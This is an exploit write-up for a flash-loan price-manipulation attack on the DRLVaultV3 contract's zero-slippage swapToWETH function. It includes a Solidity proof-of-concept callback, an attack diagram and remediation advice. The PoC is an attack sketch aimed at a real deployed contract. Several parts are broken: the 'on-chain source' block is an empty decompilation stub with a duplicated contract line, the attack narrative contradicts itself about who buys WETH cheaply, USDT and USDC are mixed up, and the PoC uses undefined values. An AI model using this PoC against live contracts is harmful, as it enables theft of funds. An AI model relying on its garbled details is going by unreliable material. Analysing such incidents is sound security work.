# DRLVaultV3 — Zero-Slippage Swap Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-11-12 |
| **Protocol** | DRLVaultV3 |
| **Chain** | Ethereum |
| **Loss** | ~100,000 USDT |
| **Attacker** | [0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671](https://etherscan.io/address/0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671) |
| **Attack Tx** | [0xe3eab35b...](https://etherscan.io/tx/0xe3eab35b288c086afa9b86a97ab93c7bb61d21b1951a156d2a8f6f5d5715c475) |
| **Vulnerable Contract** | [0x6A06707ab339BEE00C6663db17DdB422301ff5e8](https://etherscan.io/address/0x6A06707ab339BEE00C6663db17DdB422301ff5e8) |
| **Root Cause** | `swapToWETH` executes swaps with `amountOutMinimum=0`, enabling losses after price manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-11/DRLVaultV3_exp.sol) |

---

## 1. Vulnerability Overview

The `swapToWETH` function in DRLVaultV3 sets the slippage protection parameter (`amountOutMinimum`) to 0 when swapping USDC for WETH. The attacker manipulated the USDC/WETH pool price via a Morpho flash loan and a reverse swap on UniswapV3, then induced DRLVault to execute a swap under unfavorable conditions — causing the vault to exchange its USDC for WETH at a severely depressed rate, from which the attacker profited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: amountOutMinimum = 0 (no slippage protection)
interface IDRLVault {
    function swapToWETH(
        uint256 usdcAmount,
        uint256 minWethOut  // even though this parameter exists, it is used as 0 internally
    ) external;
}

// Internal implementation:
function swapToWETH(uint256 usdcAmount, uint256 minWethOut) external {
    IDexRouter(dexRouter).uniswapV3SwapTo(
        recipient,
        usdcAmount,
        0,  // ← amountOutMinimum = 0 (no slippage protection!)
        pools
    );
}

// ✅ Recommended fix: enforce actual minimum output
function swapToWETH(uint256 usdcAmount, uint256 minWethOut) external {
    require(minWethOut > 0, "slippage protection required");
    uint256 expectedOut = getExpectedOutput(usdcAmount);
    uint256 minAcceptable = expectedOut * 9900 / 10000; // allow 1% slippage
    IDexRouter(dexRouter).uniswapV3SwapTo(recipient, usdcAmount, minAcceptable, pools);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: DRLVaultV3_decompiled.sol
contract DRLVaultV3 {
contract DRLVaultV3 {

    // This contract has no standard ABI selectors.
    // Likely a minimal proxy (EIP-1167), fallback-only, or custom dispatcher.

    fallback() external payable {  // ❌ Vulnerability
        // TODO: decompilation logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Morpho Flash Loan (borrow large amount of USDC)
  │
  ├─[2]─▶ Reverse swap on UniswapV3 USDC/WETH pool
  │         Dump large USDC → WETH price spikes
  │         (WETH becomes scarce in the pool)
  │
  ├─[3]─▶ Trigger DRLVault.swapToWETH
  │         └─ amountOutMinimum=0 → manipulated price accepted as-is
  │             Vault USDC → swapped for minimal WETH
  │
  ├─[4]─▶ Unwind reverse swap (price restored)
  │         └─ Resell cheaply acquired WETH at normal price
  │
  └─[5]─▶ Repay flash loan + retain ~100,000 USDT profit
```

## 4. PoC Code (Core Logic with Comments)

```solidity
function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
    require(msg.sender == address(morpho), "only Morpho");

    // [1] Manipulate WETH price using flash-loaned USDC (dump large USDC)
    // → Reduces WETH reserve in UniswapV3 pool → WETH price spikes
    IDexRouter(DEXROUTER_ADDR).uniswapV3SwapTo(
        address(this),
        assets,         // large USDC input
        0,              // no minimum output (for price manipulation)
        manipulatedPools
    );

    // [2] Trigger DRLVault's swapToWETH
    // Vault swaps with amountOutMinimum=0 → sells USDC at manipulated high price
    IDRLVault(VAULT_ADDR).swapToWETH(vaultUsdcBalance, 0);

    // [3] Restore price: swap held WETH back to USDC
    // → Sell WETH at normal price → realize USDC profit
    IDexRouter(DEXROUTER_ADDR).uniswapV3SwapTo(
        address(this),
        wethBalance,
        0,
        normalPools
    );

    // [4] Repay flash loan principal + fee
    IERC20(USDC_ADDR).transfer(msg.sender, assets);

    // [5] Convert profit to ETH and transfer
    (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
    require(success, "ETH transfer failed");
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Slippage Protection (Zero Slippage Protection) |
| **Attack Vector** | Flash loan + AMM price manipulation + zero-slippage swap exploitation |
| **Impact Scope** | Vault USDC liquidity drained |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP Classification** | Price Manipulation / Missing Slippage |

## 6. Remediation Recommendations

1. **Enforce amountOutMinimum**: Require `amountOutMinimum > 0` for all swaps and use a realistic value.
2. **TWAP-based slippage calculation**: Dynamically calculate the acceptable slippage range relative to the TWAP price.
3. **Pre/post-swap price validation**: Verify that the price before and after a swap remains within the acceptable range.
4. **Access control on vault swaps**: Restrict `swapToWETH` to privileged accounts only (keeper, owner).

## 7. Lessons Learned

- `amountOutMinimum=0` means "I will accept any price for this swap" — this must never be permitted in production code.
- Swap logic in vault/strategy contracts is particularly vulnerable to price manipulation and always requires slippage protection.
- Slippage protection must be recognized as a security requirement, not a user-convenience feature.